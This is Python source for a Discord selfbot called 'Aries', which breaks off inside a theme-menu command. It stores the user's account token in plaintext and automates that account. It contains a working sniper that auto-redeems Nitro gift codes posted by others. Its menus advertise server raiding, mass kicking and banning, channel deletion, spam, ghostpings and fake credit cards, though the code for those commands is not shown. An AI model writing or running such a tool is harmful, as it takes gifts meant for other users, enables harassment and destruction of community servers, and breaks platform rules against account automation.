import webbrowser, asyncio, os, sys, json, discord, urllib, urllib3, math, bs4, base64, pytube, requests, re, string, random, psutil, ipapi, platform, socket, threading, subprocess, platform, math
import pyimgur, tkinter as tk, tkinter.font as font, win32gui, win32.lib.win32con as win32con, subprocess as sp, platform, mysql.connector as mysql, bitly_api
from asyncio.subprocess import Process
from inspect import EndOfBlock
from io import StringIO
from colorama.initialise import reset_all
from discord import *
from discord.ext import commands
from time import sleep
from ipwhois import IPWhois
from subprocess import call
import time
from random import betavariate, seed, randint
from colorama import init, Fore, Back, Style
from discord.ext.commands.core import command
from pytube import YouTube
from os import listdir, name
from datetime import datetime
from datetime import date
from os.path import isfile, join
from win10toast import ToastNotifier
from mysql.connector import errorcode
from PIL import Image, ImageTk
from datetime import datetime as dt
from pathlib import Path
from playsound import playsound
from itertools import cycle
from licensing.models import *
from licensing.methods import Key, Helpers
import pytube
from art import *
import mysql.connector, hashlib
start_time = dt.now()
theme = ""
commandex = ""
#Sees if beta to use tokening
global betarelease #Change the other one Aslos
betarelease = False
#Sees if license file exists
skip = False
def pb(percent=0, width=30):
    # The number of hashes to show is based on the percent passed in. The
    # number of blanks is whatever space is left after.
    hashes = width * percent // 100
    blanks = width - hashes
    print('\r                                          [', hashes*'=', blanks*' ', ']', f' {percent:.0f}%', sep='', end='', flush=True)
def getHWID():
            s = ""
            s += os.name
            s += str(platform.architecture())
            s += str(platform.version())
            s += str(os.cpu_count())
            s += str(os.getenv("PROCESSOR_IDENTIFIER"))
            s += str(os.getenv("PROCESSOR_ARCHITECTURE"))
            s += str(os.getenv("PROCESSOR_ARCHITEW6432"))
            s += str(os.getenv("NUMBER_OF_PROCESSORS"))
            return hashlib.sha256(s.encode()).hexdigest()
def printItems():
    print(Fore.RED + f"    ___         _          ".center(os.get_terminal_size().columns))
    print(Fore.RED + f"   /   |  _____(_)__  _____".center(os.get_terminal_size().columns))
    print(Fore.RED + f"  / /| | / ___/ / _ \/ ___/".center(os.get_terminal_size().columns))
    print(Fore.RED + f" / ___ |/ /  / /  __(__  ) ".center(os.get_terminal_size().columns))
    print(Fore.RED + f"/_/  |_/_/  /_/\___/____/  ".center(os.get_terminal_size().columns))
    #Checks if config file exists if it dosen't make the user input token to create one
if os.path.exists("./data/config.json"):
    pass
else:
#IF developer config file isn't found ask for the token, set it, then set prefix and token to the correct file (data/config)
    print(                   "                                                       ___         _          ")
    print(                   "                                                      /   |  _____(_)__  _____")
    print(                   "                                                     / /| | / ___/ / _ \/ ___/")
    print(                   "                                                    / ___ |/ /  / /  __(__  ) ")
    print(                   "                                                   /_/  |_/_/  /_/\___/____/  ")
    key = input("                                                      Enter Your Token: ")
    os.system('cls' if os.name == 'nt' else 'clear')
    printItems()
    pi = input(Fore.LIGHTRED_EX + "                                                        Prefix?")
    os.system('cls' if os.name == 'nt' else 'clear')
    printItems()
    qsr = input(Fore.LIGHTRED_EX + "                                                     Sniper? (y/n): ")
    os.system('cls' if os.name == 'nt' else 'clear')
    printItems()
    fni = input(Fore.LIGHTRED_EX + "                                                     Fake Nitro? (y/n): ")
    os.system('cls' if os.name == 'nt' else 'clear')
    printItems()
    sbd = input(Fore.LIGHTRED_EX + "                                               Selfbot Detector? (y/n)")
    os.system('cls' if os.name == 'nt' else 'clear')
    printItems()
    if betarelease == False:
        print("Setting Things Up...".center(os.get_terminal_size().columns))
        for i in range(100):
            pb(i)
            sleep(0.1)
    snipe = "false"
    detect = "false"
    FakeNitro = False
    if (qsr == "y"):
        snipe = "true"
    if (sbd == "y"):
        detect = "true"
    if (fni == "y"):
        FakeNitro = True

    data = {
        "token": f"{key}",
        "prefix": f"{pi}",
        "sniper": f"{snipe}",
        "detector": f"{detect}",
        "theme": "Aries",
        "AFK": "False",
        "AFK-Message": "I'm Currently Away!",
        "Fake-Nitro": f"{FakeNitro}"
    }
    ISDIR = os.path.isdir("./data")
    ISDIR2 = os.path.isdir("./data/themes")
    ISDIR3 = os.path.isdir("./assets")
    ISDIR4 = os.path.isdir("./data/notes")
    ISDIR5 = os.path.isdir("./data/beta")
    ISDIR6 = os.path.isdir("./data/emojis")
    if (not ISDIR):
        os.mkdir('./data')
    else:
        pass
    if (not ISDIR2):
        os.mkdir("./data/themes")
    else:
        pass
    if (not ISDIR3):
         os.mkdir("./assets")
    else:
        pass
    if (not ISDIR4):
        os.mkdir("./data/notes")
    if (not ISDIR5 and betarelease == True):
        os.mkdir("./data/beta")
    if (not ISDIR6):
        os.mkdir("./data/emojis")

    #Licensing For Beta
    if os.path.exists("./data/beta/license.json"):
        print("Found")
       # skip = True
    if (betarelease == True and not os.path.exists("./data/beta/license.json")):
        license = input("                                                        License: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        printItems()
        print("Setting Things Up...".center(os.get_terminal_size().columns))
        for i in range(100):
            pb(i)
            sleep(0.1)
    #For Beta Releases  
        if betarelease == True:
             pass
           # validate(license, getHWID())
    #Write To Config File
    with open("./data/config.json", "w") as f:
            f.write(json.dumps(data, indent=4))
    themedata = {
        "title": "Aries",
        "imageurl":"https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif",
        "color": "#FF0000",
        "TColor": "Red"
    }
    #Write Theme
    ISTHEME = os.path.isfile("/data/themes/Aries.json")
    if not ISTHEME:
     with open("./data/themes/Aries.json", "w") as f:
      f.write(json.dumps(themedata, indent=4))
    else:
        pass
    #Download Assets
    url = 'https://cdn.discordapp.com/attachments/811054611116982293/903074932425117696/resizedaries2.png'
    r = requests.get(url, allow_redirects=True)
    open('./assets/resizedaries2.png', 'wb').write(r.content)
    url = 'https://cdn.discordapp.com/attachments/811054611116982293/903074618905096212/ariesnobg.ico'
    r = requests.get(url, allow_redirects=True)
    open('./assets/ariesnobg.ico', 'wb').write(r.content)
#Opens the json 
with open("./data/config.json") as f:
#Loads the json to read contents
    config = json.load(f)
prefix = config.get('prefix')
token = config.get('token')
nitro_sniper = config.get('sniper')
selfbot_detector = config.get('detector')
theme_2 = config.get('theme')
afkmode = config.get('AFK')
afkmsg = config.get("AFK-Message")
afklogging = False
copier = False
NitroSound = False
fake_nitro = config.get("Fake-Nitro")
person = ""
build = "1.0.6"
commandamt = "105 "
bot = commands.Bot(prefix, self_bot=True, case_insensitive=True, guild_subscription_options=GuildSubscriptionOptions.off())
#GUI
the_program_to_hide = win32gui.GetForegroundWindow()
#win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
def runGUI():
    root = tk.Tk()
    root.overrideredirect(True)
    canvas = tk.Canvas(root)
    #When you exit also closes python
    root.protocol("WM_DELETE_WINDOW", lambda:os._exit(1))
    #Title
    root.title('Aries Launcher')
    #Size
    root.geometry('600x300+300+300')
    #Color
    root.configure(bg="gray10")
    #Icon
    root.iconbitmap("assets/ariesnobg.ico")

    #Exit Button
    exitButton = tk.Button(root, text="Exit", command=lambda:os._exit(1), height=1, width=85, bg='gray18', fg='white', borderwidth=0)
    exitButton.place(x=1, y=276)
    #Settings Button
    def dosettings():
        root1 = tk.Toplevel()
        root1.overrideredirect(True)
        canvas1 = tk.Canvas(root)
        usedfont = font.Font(family='Helvetica', size=25)
        def movewindow(event): root1.geometry('+{0}+{1}'.format(event.x_root, event.y_root))

        T1 = tk.Text(root1, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
        T1.place(x=1, y=1)
        T1.insert(tk.END, "A R I E S")
        T1.config(state='disabled')
        #Logo
        path = "assets/resizedaries2.png"
        imgy = ImageTk.PhotoImage(Image.open(path))
        paney = tk.Label(root1, image = imgy, bg='gray10')
        paney.pack(side = "left", fill = "none", expand = "no")
        paney.place(x=235, y=20)
        #Text For Theme
        usedfont = font.Font(family='Helvetica')
        T2 = tk.Text(root1, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
        T2.place(x=1, y=245)
        T2.insert(tk.END, "Themes:")
        T2.config(state='disabled')
        #Exit Button 
        exitButton2 = tk.Button(root1, text="➤", command=lambda:root1.destroy(), height=1, width=5, bg='gray10', fg='white', borderwidth=0)
        exitButton2.place(x=565, y=1)
        #Text For Notes
        usedfont = font.Font(family='Helvetica')
        T2 = tk.Text(root1, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
        T2.place(x=90, y=245)
        T2.insert(tk.END, "Notes:")
        T2.config(state='disabled')
        #Notes
        mode1 = tk.Listbox(root1, bg='gray10', fg = 'white', borderwidth=0, height=7, width=15, border=0, highlightthickness=0)
        # to insert items in the list
        myList = os.listdir('./data/notes')

        for file in myList:
            mode1.insert('end', file)
        mode1.place(x=90, y=265)
        #Themes
        mode = tk.Listbox(root1, bg='gray10', fg = 'white', borderwidth=0, height=7, width=15, border=0, highlightthickness=0)
        # to insert items in the list
        myList = os.listdir('./data/themes')

        for file in myList:
            mode.insert('end', file)
        mode.place(x=1, y=265)
        #F
        root1.bind('<Button-3>', movewindow)
        root1.bind('<B3-Motion>', movewindow)
        #Title
        root1.title('Aries Launcher - Tab: Settings')
        #Size
        root1.geometry('600x300+300+300')
        #Color
        root1.configure(bg="gray10")
        root1.mainloop()
    settingsButton = tk.Button(root, text="Settings", command=lambda:dosettings(), height=1, width=85, bg='gray18', fg='white', borderwidth=0)
    settingsButton.place(x=1, y=249)
    #Launch Button
    def showinfo():
         root3 = tk.Toplevel()
         root3.overrideredirect(True)
         def movewindow2(event): root3.geometry('+{0}+{1}'.format(event.x_root, event.y_root))
         canvas = tk.Canvas(root)
         #When you exit also closes python
         root3.protocol("WM_DELETE_WINDOW", lambda:os._exit(1))
         #Title
         root3.title('Aries Launcher')
         #Size
         root3.geometry('600x300+300+300')
         #Color
         root3.configure(bg="gray10")
         #Icon
         root3.iconbitmap("assets/ariesnobg.ico")
         #Text
         usedfont = font.Font(family='Helvetica', size=25)
         T1 = tk.Text(root3, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
         T1.place(x=1, y=1)
         T1.insert(tk.END, "A R I E S")
         T1.config(state='disabled')
         #Logo
         path1 = "assets/resizedaries2.png"
         imgy1 = ImageTk.PhotoImage(Image.open(path1))
         paney = tk.Label(root3, image = imgy1, bg='gray10')
         paney.pack(side = "left", fill = "none", expand = "no")
         paney.place(x=235, y=20)
         #To Move window using RClick
         root3.bind('<Button-3>', movewindow2)
         root3.bind('<B3-Motion>', movewindow2)
         #Exit Button for Aries Console 
         exitButton3 = tk.Button(root3, text="➤", command=lambda:os._exit(1), height=1, width=5, bg='gray10', fg='white', borderwidth=0)
         exitButton3.place(x=565, y=1)

         root3.mainloop()
    launchButton = tk.Button(root, text="Aries Console", command=lambda:showinfo(), height=1, width=85, bg='gray18', fg='white', borderwidth=0)
    launchButton.place(x=1, y=222)
    #Text
    #create Font object
    usedfont = font.Font(family='Helvetica')

    T = tk.Text(root, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
    T.place(x=1, y=1)
    T.insert(tk.END, f"Prefix: {prefix}\nTheme: {theme_2}")
    T.config(state='disabled')
    #Text2 for some reason mroe than 3 lines dosent work on Text
    T2 = tk.Text(root, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
    T2.place(x=1, y=37)
    T2.insert(tk.END, f"Commands: {commandamt}\nSniper: {nitro_sniper}")
    T2.config(state='disabled')
    #Exit Button 3
    exitButton3 = tk.Button(root, text="➤", command=lambda:os._exit(1), height=1, width=5, bg='gray10', fg='white', borderwidth=0)
    exitButton3.place(x=565, y=1)
    #Logo
    path = "assets/resizedaries2.png"
    img = ImageTk.PhotoImage(Image.open(path))
    panel = tk.Label(root, image = img, bg='gray10')
    panel.pack(side = "left", fill = "none", expand = "no")
    panel.place(x=235, y=20)
    def movewindow(event): root.geometry('+{0}+{1}'.format(event.x_root, event.y_root))
    root.bind('<Button-3>', movewindow)
    root.bind('<B3-Motion>', movewindow)
    root.mainloop()

bot.remove_command("help")
bot.remove_command("admin")
with open(f"./data/themes/{theme_2}.json") as f:
     config = json.load(f)
     color = config.get('TColor')
     if color == "Red":
         ctu = Fore.RED
     elif color == "Blue":
         ctu = Fore.BLUE
     elif color == "Green":
         ctu = Fore.GREEN
     elif color == "Cyan":
         ctu = Fore.CYAN
     elif color == "Reset":
         ctu = Fore.RESET
@bot.event
#Detects onReady if ready prints connected to the user with their discriminator and name
async def on_ready():  
    os.system('cls' if os.name == 'nt' else 'clear')
    def write2(text): 
        for x in text: 
            print(x, end="")
            sys.stdout.flush()
            sleep(0.018)
    def write(text): 
        for x in text: 
            print(x, end="")
            sys.stdout.flush()
            sleep(0.028)
    os.system(f'title Aries')
    global ctu
    print(" " + f"{ctu}          ___         _          ".center(os.get_terminal_size().columns))
    print(" " + f"{ctu}         /   |  _____(_)__  _____".center(os.get_terminal_size().columns))
    print(" " + f"{ctu}        / /| | / ___/ / _ \/ ___/".center(os.get_terminal_size().columns))
    print(" " + f"{ctu}       / ___ |/ /  / /  __(__  ) ".center(os.get_terminal_size().columns))
    print(" " + f"{ctu}      /_/  |_/_/  /_/\___/____/  ".center(os.get_terminal_size().columns))
    print("")
    print(" " + Fore.RED + "                                                     [+] Connected" + Fore.RESET + f"\n                                                         Welcome")
    #                                                  
    print("  " + Fore.LIGHTRED_EX + f"{bot.user}".center(os.get_terminal_size().columns) + Fore.RESET + "It's getting Chilly!".center(os.get_terminal_size().columns))
    print("   " + Fore.RED + f"                                                    {str(len(bot.guilds))}{Fore.RESET} Servers")
    print("   " + Fore.RED + f"                                                    {str(len(bot.user.friends))} {Fore.RESET}Friends")
    print(Fore.RESET + "════════════════════════════════════════════════════════════".center(os.get_terminal_size().columns))
    print(Fore.RESET + "Ram the opposition with Aries".center(os.get_terminal_size().columns))
    print("\n" + Fore.RED + "Info " + Fore.RESET + "| " + Fore.LIGHTRED_EX +"[-] " + commandamt + Fore.RESET + "Commands!")
    print(Fore.RED + "Info " + Fore.RESET + "| " + Fore.LIGHTRED_EX +"[-] " + Fore.RESET + "Build » " + Fore.LIGHTRED_EX + build + Fore.RESET)
    print(Fore.RED + "Info " + Fore.RESET + "| " + Fore.LIGHTRED_EX +"[-] " + Fore.RESET + "Prefix » " + Fore.LIGHTRED_EX + str(prefix) + Fore.RESET)
    print(Fore.RED + "Info " + Fore.RESET + "| " + Fore.LIGHTRED_EX +"[-] " + Fore.RESET + "Sniper » " + Fore.LIGHTRED_EX + str(nitro_sniper) + Fore.RESET)
    print(Fore.RED + "Info " + Fore.RESET + "| " + Fore.LIGHTRED_EX +"[-] " + Fore.RESET + "Selfbot Detector » " + Fore.LIGHTRED_EX + str(selfbot_detector) + Fore.RESET)
    print(Fore.RED + "Info " + Fore.RESET + "| " + Fore.LIGHTRED_EX +"[-] " + Fore.RESET + "Copycat » " + Fore.LIGHTRED_EX + str(copier) + Fore.RESET)
@bot.event
async def on_command(cdm):
    print(Fore.LIGHTRED_EX + f"[Event] | " + Fore.RESET + f"Executed" + Fore.LIGHTRED_EX + f" {commandex}" + Fore.RESET + f" Command")
@bot.event
async def on_message(message):
    #Testing
    if (fake_nitro == "True"):
        if (message.author == bot.user and ":kekw:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/905936038080446514.png?size=44")

        if (message.author == bot.user and ":pepeheart:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/836195152103604254.png?size=44")

        if (message.author == bot.user and ":pepecry:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/888517711309721691.png?size=44")
            
        if (message.author == bot.user and ":exactly:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/922883421636800572.gif?size=44")

        if (message.author == bot.user and ":peperave:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/694036644998807592.gif?size=44")

        if (message.author == bot.user and ":picardo:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/891675815832584262.png?size=44")

        if (message.author == bot.user and ":yeetusdeletus:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/886018572453822554.png?size=44")

        if (message.author == bot.user and ":klas:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/901635160871690310.png?size=44")
        
        if (message.author == bot.user and ":sadklas:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/901635219101208647.png?size=44")
    #TODO REDO THIS
    cont = str(message.content)
    if (cont.startswith(f"{prefix}") and message.author == bot.user):
        global commandex
        commandex = cont.lstrip(prefix)
    global afkmsg
    #AFK Mode
    if isinstance(message.channel, discord.channel.DMChannel) and message.author != bot.user and afkmode == 'True':
       await message.channel.send(f"{afkmsg}")
    mention = f'<@!{bot.user.id}>'
    if (mention in message.content and afkmode == 'True'):
        await message.channel.send(f"{afkmsg}")
    #Copycat
    if message.author.name == person and copier:
         await message.channel.send(message.content)
    #Loads All Embeds it finds
    embeds = message.embeds
    if selfbot_detector == 'true':
     for embed in embeds:
        #Gets Embed contents
        getEmbed = embed.to_dict()
        #Converts embed to a string
        convertedEmbed = str(getEmbed)
        #Searches for Luna in contents TODO: Add more checks to improve
        if "Luna" in convertedEmbed:
            #If found print 
         print(Fore.CYAN + "Info" + Fore.RESET + " |" + Fore.RED + " [!]" + Fore.CYAN + " Selfbot Found! On » " + Fore.LIGHTCYAN_EX + str(message.author) + Fore.CYAN + " » Server » " + Fore.LIGHTCYAN_EX + str(message.guild) + Fore.CYAN + " » Selfbot » " + Fore.LIGHTCYAN_EX + "Luna")
    #Detects if it starts with gifting to see if its not just any msg and checks if sniper is active
    if nitro_sniper == 'true' and 'discord.gift/' in message.content:
        code = re.search("discord.gift/(.*)", message.content).group(1)
        if len(code) >= 16:
            code = re.search("discord.gift/(.*)", message.content).group(1)
            r = requests.post(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', json={'channel_id': message.channel.id}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            r = r.text
            if 'This gift has been redeemed already' in r:
                print(Fore.CYAN + " Info |" + Fore.RED + "[Nitro]" + Fore.CYAN + " Sadly this code has been redeemed already. | " + Fore.RESET + f" Code: {code} | " + Fore.RED + "Error")
            elif 'nitro' in r:
                print(Fore.CYAN + "Info |" + Fore.GREEN + "[Nitro] " + Fore.CYAN + " Nitro Sniped Successfully! | " + Fore.RESET +  f"Code: {code}'")
                   # playsound(f'{os.getcwd()}/assets/nitro.mp3')
            elif 'Unknown Gift Code' in r:
                print(Fore.CYAN + "Info | " + Fore.YELLOW + "[Nitro] " + Fore.CYAN + f"An invalid code was posted | Code: {code} | " + Fore.RED + "Error")
               # if NitroSound == True:
            else:
                pass
        else:
          #Checks length for fakes
          print(Fore.YELLOW + f"[!] Detected a fake code: {code}")
    await bot.process_commands(message)

@bot.command()
#Help Command
async def help(ctx):
    global build
    global commandamt
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    #readableHex
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = f"\nHelp » Display this menu » [{prefix}help]\nAdmin » Display the admin page » [{prefix}admin]\nFun » Display the fun page » [{prefix}fun]\nMisc » Display the Misc page » [{prefix}misc]\nNSFW  » Display the NSFW page » [{prefix}nsfw]\nSettings » Show the Settings page » [{prefix}settings] \nNotes » Display the Aries Notes page » [{prefix}notes]\nSquidgames » Display the Squidgames page » [{prefix}squidgames]\nAbuse » Display the Abuse page » [{prefix}abuse]\nTheme » Display the Themes page » [{prefix}theme]\nUtilities » Display the Utilities page » [{prefix}utilities]\nSounds » Display the Sounds page » [{prefix}Sounds]\nBeta » Display the Beta Info page » [{prefix}Beta]\n\n**Aries Version » {build} » Commands » {commandamt} » Prefix » {prefix}** " , color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed)   
@bot.command()
async def text(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries Text Menu", description = f"ASCII Gen » Gen ASCII Text » [{prefix}ascii<text>]\nTypewrite » Write some text » [.typewrite <Delay, Message>]\nCodeblock » Write some text in a codeblock » [.codeblock <Mode, Message>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
@bot.command()
async def beta(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries Beta Menu", description = f"Isbeta » Is your build beta? » [{prefix}isbeta<>]\nKeyinfo » Display your beta key info (if you have beta) » [{prefix}keyinfo<>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
@bot.command()
async def sounds(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries Notification Sounds Menu", description = f"NitroSound » Toggle NitroSound » [{prefix}NitroSound<True/False>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
#Abuse Command
@bot.command()
async def abuse(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    #readableHex
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries Abuse Menu", description = f"Kickall » Kick all members of a server » [{prefix}kickall]\nDelchannels » Delete all server channels » [{prefix}delchannels]\nRaid » Raid a server » [{prefix}raid]\nCreatechannels » Create 70 channels » [{prefix}createchannels]\nBanAll » Ban all users » [{prefix}banall <None>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
#Admin Command & Categories for "Help"
@bot.command()
async def admin(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    #readableHex
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries Administrator Menu", description = f"Ban » Ban A Member » [{prefix}ban <Person>]\nKick » Kick A Member » [{prefix}kick <Person>]\nUnban » Unban a user » [{prefix}unban <User>]\nPurge » Purge <> of msgs » [{prefix}purge <Amount>] » [Amount]\nCreate » Create a channel » [{prefix}Create <Args>]\nDelete » Delete a channel » [{prefix}delete <None>]\nListbans » Show all bans » [{prefix}listbans <None>]\nNuke » Nukes the channel sent in » [{prefix}nuke <None>]\nBanrecord » Saves serv bans to a file » [{prefix}banrecord <None>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
#Notes Page
@bot.command()
async def notes(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    #readableHex
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries Notes Menu", description = f"CN » Create a note » [{prefix}cn <Name, Content>]\nEN » Edit a note » [{prefix}en <Newname, Newcontent>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
#Squidgames Page
@bot.command()
async def Squidgames(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    #readableHex
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries Squidgames Menu", description = f"evenorodd » guess even or odd! » [{prefix}evenorodd <None>]\nsteppingstones » Are you safe? » [{prefix}steppingstones <None>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
#Fun Commands
@bot.command()
async def fun(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    #readableHex
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries Fun Menu", description = f"RollDice » Roll a Number! » [{prefix}roll <None>]\nAllah » Talk to ALLAH » [{prefix}allah <None>]\nPickup Line » Tell a pickup » [{prefix}pickup <None>]\nJoke » Tell a joke » [{prefix}joke <None>] \nRickRoll » Rick ur friends ;) » [{prefix}rickroll <None>]\nLeave » Leave the current server » [{prefix}leave <None>]\nFakeNitro » Sends a Fake Nitro Message » [{prefix}fakenitro <None>]\nSpam » Spam a message » [{prefix}spam <Delay, amount message>]\nMeme » Send a random meme » [.meme <None>] \nUpload » Upload an img to imgur » [.uploadimg <Image Here>]\nCopycat » Copy a user! » [.copycat <User, True/False>]\nHowgay » How gay is a user? » [.howgay <User>]\nDicksize » How big is a users dick? » [.dicksize <User>]\nInsult » Insult someone! » [.insult <Person>]\nIQ » Get Someones IQ » [.IQ <Person>]\nGhostping » Ghostping someone! » [.ghostping <Person>]\nRocket » Rocket animation in console! » [.rocket <None>]\nFaketoken » Generate a fake discord token » [.faketoken <None>]\nJumpscare » Send a jumpscare » [.jumpscare <None>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
#Misc Commands
@bot.command()
async def misc(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    #readableHex
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries Misc Menu", description = f"Restart » Restarts Aries » [{prefix}restart <None>]\nUserinfo » Shows your userinfo » [{prefix}userinfo <None>]\nTodo » Shows the bots TODO list » [{prefix}todo <None>]\nAvatar » Display Avatar of a user » [{prefix}Avatar <User>]\nInvite » Get an invite to Aries » [{prefix}ariesinvite <None>]\nEmbed » Sends an Embed message » [{prefix}embed <Title, Desc>]\nNick » Change your nickname » [{prefix}nick <Newnick>]\nDate » Check the date » [{prefix}date <None>]\nTime » Check the time! » [{prefix}time <None>] \nServer » Get Server Info! » [{prefix}server <None>]\nInvite » Get the server invite! » [{prefix}invite] \nSend Noti » Send a windows noti » [{prefix}sendnoti <Title, Message>]\nGen Password » Gen a pass » [{prefix}genpass <Length>]\nUptime » Check the time sinch Launch » [{prefix}uptime <None>] \nEncode b64 » Encode msg using b64 » [{prefix}ecb64 <Message>]\nDecode b64 » Decode a b64 msg » [{prefix}dcb64 <Message>]\nServerEmojis » Send a list of server emojis » [{prefix}serveremojis <None>]\nSpamReact » Spam react to a msg » [{prefix}spamreact <MSG ID>]\nCheckBan » Check a hypixel ban » [{prefix}checkban <uuid, banid>]\nFolder » Open the Aries folder » [{prefix}folder <None>]\nFakeCard » fake credit card » [{prefix}fakecreditcard <None>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
#NSFW Commands
@bot.command()
async def nsfw(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    #readableHex
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries NSFW Menu", description = f"Boobs » Shows boobs » [{prefix}boobs <None>]\nHentai » shows hentai » [{prefix}hentai <None>]\nPussy » Show pussy » [{prefix}pussy <None>]\nHentaiGif » shows hentai gif » [{prefix}hentaigif <None>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
#Theme Commands
@bot.command()
async def theme(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
